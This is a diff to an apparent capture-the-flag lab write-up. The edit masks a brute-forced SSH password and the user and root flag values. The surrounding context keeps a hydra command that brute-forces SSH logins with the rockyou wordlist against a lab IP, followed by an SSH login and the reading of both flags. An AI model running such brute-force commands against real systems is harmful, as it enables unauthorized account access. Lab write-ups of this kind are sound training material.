@@ -53,13 +53,13 @@ Command: `hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.49.145.249`
 
 Result:
 - login: `jake`
-- password: `987654321`
+- password: `987***`
 - Hydra successfully brute-forced into Jake's account.
 
 ### SSH Login
 Commands: 
 `ssh jake@10.49.145.249`
-  - Type the password `987654321` when prompted.
+  - Type the password when prompted.
 `whoami`
   - I am logged in as `jake`
 `pwd`
@@ -76,7 +76,7 @@ Commands:
 `ls /home/holt`
   - Holt's directory contains `user.txt`
 `cat user.txt`
-  - The user flag is `ee11cbb19052e40b07aac0ca060c2***`.
+  - The user flag is `ee1***`.
 
 ### Privilege Escalation
 Commands:
@@ -92,4 +92,4 @@ Commands:
 `ls /root`
   - the root's directory contains `root.txt`
 `cat root.txt`
-  - the root flag is `63a9f0ea7bb98050796b649e8548***`.
+  - the root flag is `63a***`.
